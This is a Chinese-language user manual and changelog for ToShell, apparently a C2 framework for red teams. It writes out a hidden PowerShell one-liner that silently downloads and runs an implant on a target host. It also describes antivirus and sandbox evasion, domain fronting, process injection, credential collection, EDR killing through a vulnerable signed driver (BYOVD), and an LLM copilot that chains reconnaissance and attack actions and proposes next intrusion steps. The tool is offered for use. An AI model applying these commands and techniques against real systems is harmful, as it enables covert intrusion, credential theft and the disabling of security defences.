# ToShell Team Server 使用说明

> **当前版本: v1.2.0(2026-08)** · 更新日志见文末「附」章节。

> ToShell 是一个自托管的 C2(命令与控制)框架,用于授权红队演练、渗透测试与安全研究。请仅在获得授权的前提下使用。

> **作者:青山、Q1lintu、c0ffee(核心开发者)** · © 2026 ToShell (Tanovo)

---

## 一、项目简介

ToShell 由三部分组成:

| 组件 | 说明 |
|---|---|
| **Team Server** | 服务端,提供 Web 控制台、REST API、TCP C2 监听器、载荷生成 |
| **Web 控制台** | 浏览器管理界面(会话管理、文件管理、载荷生成、插件等) |
| **Implant(植入端)** | 由服务端生成的客户端程序,运行在目标主机,通过 TCP 回连服务端 |

通信架构:植入端通过 **TCP 长连接(自定义加密帧,控制帧 AES-256-GCM + 隧道 SM4-GCM)** 或 **HTTPS 轮询通道(域前置)** 与监听器通信;Web 控制台通过 REST API(JWT 认证)管理服务端,交互终端走 WebSocket。

---

## 二、快速部署

### 1. 环境要求(运行服务端)

| 项 | 要求 |
|---|---|
| 操作系统 | Windows / Linux / macOS(提供对应平台二进制) |
| CPU 架构 | amd64 / arm64 |
| 内存 | ≥ 256MB(推荐 1GB) |
| 磁盘 | ≥ 1GB |
| 网络 | 需开放 C2 监听端口(默认 8080)与 API 端口(默认 18081) |

> 若需要在服务端**生成载荷**,还需安装 Go 工具链,详见下文「三、生成载荷」。

### 2. 部署步骤

1. 将 `release/` 目录整体拷贝到服务器(目录内 `implant/` 为植入端编译模板,必须与可执行文件保持同目录);
2. 按需编辑 `configs/server.yaml`:
   - **必改**:`listener.public_host`(服务器公网 IP/域名)、`auth.api_keys`、`auth.jwt_key`、`listener.encryption_key`;
   - 若 `encryption_key` / `jwt_key` 留空,首次启动会自动生成并写回配置文件;
3. 启动服务端:
   ```bash
   ./toserver           # Linux / macOS
   toserver.exe         # Windows
   ```
4. 浏览器访问 `http://<服务器IP>:18081`,使用默认账号 `admin / toshell` 登录(登录后请立即修改密码)。

### 3. 默认凭据与安全提醒

| 项 | 默认值 | 说明 |
|---|---|---|
| 管理员账号 | `admin` | 在 `auth.admin_username` 配置 |
| 管理员密码 | `toshell` | 配置中为 bcrypt 哈希,可改为明文后重启自动哈希 |
| API Key | `change-me` | 调用 API 时通过 `X-API-Key` 请求头传递,部署后必须更换 |

> **上线前必须更换**:API Key、JWT 密钥、监听加密密钥、管理员密码。更换加密密钥后,**所有已生成的植入端必须重新生成**(旧植入端无法与新密钥通信)。

---

## 三、生成载荷(重点)

### 1. 环境要求

生成载荷是在**服务端**上通过调用 Go 工具链完成的,因此:

| 项 | 要求 |
|---|---|
| Go 工具链 | **Go ≥ 1.21(推荐 1.24)**。检查:`go version` |
| 网络 | 服务端需能访问 Go module proxy(`proxy.golang.org`,可配置 `GOPROXY`) |
| CGO | 无需(植入端以 `CGO_ENABLED=0` 交叉编译,不需要 gcc) |
| 磁盘/内存 | 编译临时目录需可写;生成多个载荷时注意磁盘空间 |

> **Windows 老系统兼容(Windows 7 / Server 2008 R2)**:
> 从 Go 1.22 起编译的 exe 启动时会依赖 `GetSystemTimePreciseAsFileTime`(仅 Windows 8+ 提供),
> 在 Windows 7 / Server 2008 R2 上会报"无法定位程序输入点"导致**无法启动**。
> 因此服务端生成 **Windows 载荷时自动切换 Go 1.20.14 工具链**编译(`GOTOOLCHAIN=go1.20.14`,
> 由本机 Go ≥ 1.21 自动下载并缓存,无需手动安装),保证老系统兼容。
> - 首次生成 Windows 载荷时会自动下载 go1.20.14 工具链(约 120MB),耗时较长,属正常;
> - 该逻辑仅对 Windows 目标生效,Linux/macOS 载荷仍使用本机工具链;
> - 开启 garble 混淆时不切换(garble 与 go1.20 不兼容),此时老系统兼容由用户自行权衡。

> **GOPROXY 配置命令**(国内网络建议切换加速镜像):
> - 查看当前配置:`go env GOPROXY`
> - 使用官方代理:`go env -w GOPROXY=https://proxy.golang.org,direct`
> - 使用国内加速镜像(七牛):`go env -w GOPROXY=https://goproxy.cn,direct`
> - 使用阿里云镜像:`go env -w GOPROXY=https://mirrors.aliyun.com/goproxy/,direct`
> - 临时只对单次命令生效(不改全局配置):`GOPROXY=https://goproxy.cn,direct go mod download`
> - 验证能否正常拉取依赖:`go mod download`(无报错即说明代理可达)

### 2. 依赖库

植入端编译依赖以下 Go 库(`go mod tidy` 自动拉取):

| 库 | 用途 |
|---|---|
| `golang.org/x/sys` | 跨平台系统调用(WinAPI / 系统信息 / 进程操作) |
| `golang.org/x/text` | 简体中文 GBK/UTF-8 转码(Windows 命令输出) |
| `golang.org/x/crypto` | 加密原语(如 HMAC/随机数) |

> 服务端本体依赖 `go-sqlite3`、`viper`、`gorilla/mux`、`gorilla/websocket`、`golang-jwt` 等,运行**无需编译**;仅生成载荷时需要上述植入端依赖。

### 3. 可选工具(强烈建议安装)

| 工具 | 安装命令 | 用途 |
|---|---|---|
| **garble** | `go install mvdan.cc/garble@latest` | Go 源码混淆,提升免杀效果(`-literals -tiny` 等参数) |
| **UPX** | 见 https://upx.github.io | Windows exe 压缩,减小体积(仅 Windows 目标) |

安装后确认可执行:`garble version` / `upx --version`。
服务端启动日志会显示是否检测到这两个工具;若未检测到,生成载荷时对应的混淆/压缩选项将不可用。

> **garble 版本兼容性**:最新版 garble(v0.16+)要求 **Go ≥ 1.26**。若 Go 版本较旧,生成载荷时开启 garble 会报
> `Go version "goX.Y.Z" is too old; please upgrade to goX.Y.Z or newer`。
> 解决办法:升级 Go 工具链,或安装与当前 Go 版本兼容的旧版 garble(如 `go install mvdan.cc/garble@v0.15.0`)。

### 3.1 内置免杀/隐藏特性(无需额外工具)

即使不安装 garble/UPX,生成的载荷已内置以下隐藏特性(默认开启,对 exe / raw / dll 等格式均生效):

| 特性 | 说明 |
|---|---|
| **编译期字符串混淆** | 服务端在编译前自动扫描植入端源码,将敏感字符串(C2 回连地址、API 函数名、配置块标识、安全软件特征等)加密为运行时解码调用,二进制中不残留明文 |
| **配置块加密** | 植入端的回连地址/加密密钥等配置以 **XOR 加密块**形式附加在二进制尾部,通过加密后的标识常量定位,二进制中无明文 magic 与明文 URL |
| **反沙箱/反调试** | 植入端启动时检测调试器(`IsDebuggerPresent`)与常见沙箱/分析环境进程(VMware、VirtualBox、Sandboxie、Wireshark 等),CPU < 2 核或内存 < 2GB 时延迟执行 |
| **老系统兼容** | Windows 载荷自动使用 Go 1.20.14 工具链编译,兼容 Windows 7 / Server 2008 R2 |

> 验证方式:生成的 exe 中搜索 `TOSHELL_CFG_V1`、回连 IP/域名、`VirtualAllocEx` 等字符串应均无明文。
> 注意:混淆不改变载荷功能,但极个别杀软仍可能因行为特征报毒,建议结合 garble + UPX 使用。

### 4. 支持的目标平台

| 目标系统 | 架构 | 生成格式 |
|---|---|---|
| Windows | amd64 / 386 / arm64 | exe / dll / bin / raw / shellcode(txt) |
| Linux | amd64 / 386 / arm64 | elf(无扩展名) / raw / shellcode |
| macOS | amd64 / arm64 | macho / raw / shellcode |

> 部分平台专属功能(持久化、凭据收集、截图、进程注入)仅 Windows 可用,其余平台会返回"仅支持 Windows"提示。

### 5. 生成步骤(Web 控制台)

1. 打开「生成载荷 / Implants」页面;
2. 选择:目标系统、架构、格式、回连服务器地址(`listener.public_host` + 端口)、回连间隔;
3. 按需开启:garble 混淆、UPX 压缩、XOR 加密;
4. 点击「生成」,等待构建完成(首次构建需拉取依赖/工具链,耗时较长);
5. 在列表中点击「下载」获取载荷。**已生成的载荷再次下载会直接从磁盘返回,不会重新编译**,速度极快。

### 5.1 一条命令上线(对应不同监听)

生成 **exe / raw**(Windows amd64)载荷后,页面会给出**一条命令上线**命令,
直接复制到目标主机(CMD 或 PowerShell 均可)执行,即可静默下载并运行该载荷,无需手动传文件:

```powershell
powershell -w hidden -nop -ep bypass -c "Invoke-WebRequest -UseBasicParsing 'http://<后台地址>:18081/api/v1/implant/payload/<载荷ID>' -OutFile $env:TEMP\svc.exe; Start-Process -WindowStyle Hidden $env:TEMP\svc.exe"
```

- 该下载端点 `/api/v1/implant/payload/{id}` **免认证**,URL 内已绑定载荷 ID,只有拿到该载荷 ID 的人才可下载;
- 不同监听器对应不同载荷:生成时选择哪个监听器,命令就指向对应回连地址,命令中的下载地址取当前后台访问地址;
- 载荷列表每项也有「一条命令上线」按钮,可随时复制对应命令。

### 6. 命令行方式(可选)

Web 控制台内置任务调度,命令行方式适合脚本化:

```bash
# 1) 生成载荷(保存到 implants/ 目录,返回 JSON 含 sha256 / download_url)
curl -X POST http://<IP>:18081/api/v1/builders \
  -H "Authorization: Bearer <JWT>" -H "Content-Type: application/json" \
  -d '{"name":"demo","format":"exe","os":"windows","arch":"amd64","server_url":"1.2.3.4:8080"}'

# 2) 下载已生成的载荷(可重复下载,直接读磁盘,不重新编译)
curl -X POST http://<IP>:18081/api/v1/builders/download \
  -H "Authorization: Bearer <JWT>" -H "Content-Type: application/json" \
  -d '{"name":"demo"}' -o demo.exe
```

---

## 四、Web 控制台功能

| 模块 | 功能 |
|---|---|
| **仪表盘** | 会话统计、系统信息、版本信息(关于页) |
| **会话** | 会话列表、信息查看、备注、删除、心跳状态 |
| **会话详情** | 系统信息、进程列表、进程注入、交互 Shell、文件管理、截图、BOF 插件、持久化、凭据收集 |
| **文件管理** | 目录浏览、文件上传/下载/删除/重命名/预览 |
| **生成载荷** | 多平台载荷生成(见上文) |
| **模板/插件** | BOF 插件上传与加载管理 |
| **监听器** | TCP / HTTP(S) / WebSocket / MQTT 多通道管理(启动/停止/删除),实时连接数 |
| **隧道** | SOCKS5 隧道代理(起代理横向访问内网) |
| **AI 副驾驶** | LLM 对话 + 30+ 工具闭环,自动理解会话上下文并编排侦察→行动→复盘;支持权限模式(正常模式影响会话操作需确认,任务流除外)与操作审批弹窗 |
| **任务流** | 可编辑任务流模板一键化执行多步链路,跑完自动由 AI 给出结果综述与下一步攻击建议(横向/提权/凭据/域渗透) |
| **通道健康** | 四通道(TCP/HTTP/WS/MQTT)在线会话数与监听器数报表 |
| **登录日志** | 后台登录审计(成功/失败) |

### 文件传输说明

- **上传**:Web 控制台直接选择文件,按 **1MB 分片直传目标主机**并写盘,带实时进度条,支持大文件(无 20MB 限制);
- **下载(小文件 ≤ 2MB)**:植入端 base64 直传,即时返回;
- **下载(大文件 > 2MB)**:植入端按 1MB 分块直传服务端磁盘(`data/transfers/`),控制台再从服务端**流式下载**,支持断点续传,不占用数据库、不一次性载入内存;
- 已生成过的载荷重复下载直接从磁盘返回(不重新编译)。

### 仪表盘统计口径说明

| 指标 | 口径 |
|---|---|
| **总任务** | 数据库全部任务记录(`total`,包含 sent/pending/running 等中间态) |
| **成功率** | 分母只统计**已出结果**的任务:`completed + failed + timeout`。`sent/pending/running` 等下发中/等待中的任务不参与分母,避免正在执行的任务拉低成功率显示 |

> 示例:共 10 条任务,其中 6 条完成、2 条失败、1 条超时、1 条还在下发中(sent)。
> 总任务显示 10,成功率 = 6 / (6+2+1) = 67%,而不是 6/10 = 60%。

### 截图与 BOF 优化

- 截图:PNG 快速编码;超大截图(>2MB)自动切换 JPEG(体积更小、回传更快);
- BOF:系统 DLL 句柄缓存,符号解析无需反复加载 DLL,加载速度显著提升。

---

## 五、云端部署注意事项

1. **安全组/防火墙**:放行 C2 端口(默认 8080)与 API 端口(默认 18081);
2. **域名与证书**:建议使用 HTTPS 访问控制台(`server.tls_cert` / `server.tls_key`),C2 可启用 TLS(`listener.tls_enabled` + `cert_file` / `key_file`);
3. **密钥管理**:`encryption_key`、`jwt_key` 留空可自动生成;更换后需重新生成所有植入端;
4. **数据库**:默认 SQLite 单文件(`data/toshell.db`),建议定期备份;高并发可切换 PostgreSQL;
5. **日志**:默认输出到 stdout,可配置 JSON 格式输出到文件并按天轮转压缩;
6. **清理**:会话删除后,`data/transfers/` 下的已下载大文件不会自动清理,可定期手动删除。

### 5.1 发布正式版(清空历史数据)

正式发布前需要清空历史任务/会话/日志记录时,使用项目内脚本 `scripts/reset_release_db.py`:

```bash
# 清空项目根目录库(开发/构建环境)
python scripts/reset_release_db.py

# 清空 release/ 目录正式库(正式版 toserver 运行在 release/ 下,库路径为相对路径 ./data/toshell.db)
python scripts/reset_release_db.py --db release/data/toshell.db
```

脚本功能:

| 操作 | 说明 |
|---|---|
| **备份** | `VACUUM INTO` 一致性快照到 `data/backup/`,含 WAL 未落盘数据;自动保留最近 20 份 |
| **清空** | `tasks`(任务)、`sessions`(会话)、`logs`(日志)三张表 |
| **重置** | 重置 `tasks`/`logs` 自增序列,后续 ID 从 1 重新开始 |
| **保留** | `listeners`(监听器)、`custom_templates`(自定义模板)、`implants`(植入物记录)不受影响 |

> **重要**:
> - 执行前请先**停止服务端进程**,再执行脚本,最后重新启动,否则 Web 仍会显示内存中的旧任务;
> - 脚本执行前若需保险,可先用 `--no-backup` 外的手动复制再执行,或直接依赖脚本自带备份;
> - 只清空不备份:`python scripts/reset_release_db.py --no-backup`(不推荐,除非已自行备份)。

---

## 六、常见问题

| 问题 | 解决方法 |
|---|---|
| 植入端无法回连 | 检查 `listener.public_host` 是否为公网可达地址、端口是否放行、加密密钥是否一致 |
| 生成 Linux/macOS 载荷报错 `undefined: handleXxx` | 请使用本次修复后的版本(已为 Linux/macOS 补充功能 stub);同时更新 `release/implant/` 模板 |
| 下载载荷很慢 | 已生成过的载荷再次下载直接从磁盘返回(不重新编译);首次生成因拉依赖/编译较慢属正常 |
| 载荷体积与页面显示不符 / 体积翻倍 | **shellcode(.txt)格式保存的是 hex 文本,体积是原始字节的 2 倍属正常**。需要更小的请生成 `bin`(原始二进制)或 `raw` 格式;页面显示已按实际下载文件大小修正 |
| Windows 7 / Server 2008 R2 上 exe 无法启动 | 该问题已修复:服务端生成 Windows 载荷时自动使用 Go 1.20.14 工具链编译(见上文"老系统兼容")。若仍失败,确认使用的是最新版 `toserver` |
| 大文件下载失败 | 确认 `data/transfers/` 可写;大文件走流式下载通道 |
| garble/UPX 选项不可用 | 服务端未安装对应工具,按上文安装后重启服务端 |
| 登录日志不显示图标 | 旧版本日志级别为大写格式,升级后新日志统一为小写,图标全部正常 |
| 后台 401 | 登录后 Token 有效期 24h;使用 `X-API-Key` 时需在 `auth.api_keys` 配置 |
| 清空数据库后 Web 仍显示旧任务 | **服务端内存缓存了任务,需重启服务端进程**。任务列表/统计优先读内存,清空数据库只清磁盘,重启后才会同步为空 |
| 成功率偏低 / 与预期不符 | 成功率分母只统计已出结果任务(`completed+failed+timeout`),`sent/pending/running` 下发中任务不计入分母(见上文统计口径) |

---

## 七、免责声明

本工具仅限**授权测试**与安全研究使用。使用者须自行遵守当地法律法规,因滥用造成的后果与作者无关。

---

## 附、更新日志与新增功能

### v1.2.0(2026-08)
- **AI 副驾驶(全新)**:内置 LLM ReAct 智能副驾驶(30+ 工具),自动注入当前在线会话上下文、连续编排「侦察→行动→等结果→复盘」;支持 Markdown 结构化输出;删除原"自主规划"(鸡肋功能)。
- **权限模式与操作审批**:设置页「AI 副驾驶」新增权限模式(全自动 / 正常模式),正常模式下影响会话的操作(命令/文件/进程/凭据/截屏/隧道/插件等)执行前弹窗需用户「允许/拒绝」,任务流(delegate)除外;热生效,无需重启。
- **任务流(剧本)统一**:副驾驶任务面板与「任务模板」页同源(数据库模板),可编辑/删除;模板即任务流,一键执行跑完自动由 AI 给出结果综述+下一步攻击建议;内置 3 个示例模板(可删可改)。
- **自主任务规划器已移除**:其"多阶段规划"为占位实现,功能鸡肋,已删除。
- **多通道监听**:新增 MQTT 监听器(内嵌/外部 broker),监听器页支持 TCP/HTTP/WebSocket/MQTT;监听列表连接数改为实时统计在线会话数。
- **免杀加固**:每构建随机化配置块魔数/密钥、xd 字符串密钥基准、API 哈希种子/乘子,打破跨样本同指纹;进程注入自动随机挑选良性宿主(explorer/svchost/dllhost/Teams 等);配置块魔数与 XOR 密钥三端(服务端/Go/C 植入端)一致。
- **副驾驶体验**:左「在线会话」右「最近任务」三栏布局,聊天区更宽;任务完成自动在对话给一条 AI 建议(按触发批次去重,不刷屏);上下文压缩(历史限 14 条/单条截断)控制 token 与超时。
- **仪表盘**:最近任务命令过长自动截断,修复撑爆布局。

### v1.1.0(2026-08)

### 1. 回连通道与载荷生成
- **双回连通道**:TCP(自定义加密帧协议,载荷约 3.4MB,全功能)与 HTTP(S) 轮询通道。
  生成载荷页「回连通道」按监听器类型自动匹配:选 TCP 监听器 → 通道 TCP、地址 `host:port`(勿加 `http://` 前缀,误加会自动剥离);选 HTTP/HTTPS 监听器 → 通道 HTTP/HTTPS、地址 `http(s)://host:port`。
- **域前置(Domain Fronting)**:HTTPS 轮询通道支持自定义 TLS SNI 与 HTTP Host 拟态域名(构建页「域前置拟态域名」或 `listener.front_domain`)。服务器部署在 CDN/反向代理后,目标机出站流量表现为访问合法域名,可过域名白名单出口。
- **transport 条件编译**:TCP 载荷不链接 net/http/crypto/tls,体积由约 6MB 降至 3.4MB(约减半),标准库指纹更少,利于免杀。
- **监听器页简化**:合并"类型/协议"为单一「类型」选择(TCP / HTTP),不再出现易混淆的 WebSocket 等协议值。

### 2. 网络与对抗能力
- **Beacon Mesh 中继**:在线会话可一键升级为中继节点(会话详情「中继」页),叶子植入端链式回连,支持多跳;中继链路 SM4-GCM 加密;构建页可从在线中继列表直接选取回连地址。
- **实时屏幕流**:会话详情「屏幕流」页,前端支持缩放与全屏。
- **内核级对抗(Windows,实验性)**:EDR 失明(ntdll 脱钩 + ETW 抑制 + Autologger 禁用)、EDR 击杀、BYOVD 驱动加载(内置原厂签名 RTCore64.sys,SHA-256 `01AA278B…E87F1FD` 已核对)、PPL 保护清除(RTCore64 任意内核虚拟地址读写,EPROCESS.Protection 偏移按 Windows 版本自适应,24H2+ 为 0x5FA)。

### 3. 设置与运维
- **运行时设置热更新**:设置页真实读写配置(监听器/拟态模板/通知/账户),webhook、流量拟态模板、认证信息保存即热生效,无需重启进程;配置文件被外部修改自动重载。
- **钉钉等 webhook 通知**:自动识别钉钉机器人(markdown 格式,支持加签;加签 Secret 在 `server.yaml` 的 `webhook.secret` 配置),并支持企业微信/飞书/Slack/通用 JSON;设置页通知页可一键「发送测试通知」验证。
- **内置 BYOVD 驱动下载**:服务端内置 RTCore64.sys(原厂签名),杀软对抗页一键加载,无需手动准备驱动文件。

### 4. 注意
- 升级后请**重启服务端**并**重新生成植入端**(旧植入端与新密钥/新模板不兼容)。
- 域前置与 HTTPS 轮询需要服务器配置 TLS 证书(`listener.tls_enabled` + `cert_file`/`key_file`)并部署在 CDN/反向代理之后。
- 内核级对抗(BYOVD/PPL/EDR 击杀)为实验性能力,偏移与驱动行为随系统版本变化,需在目标环境实机验证。
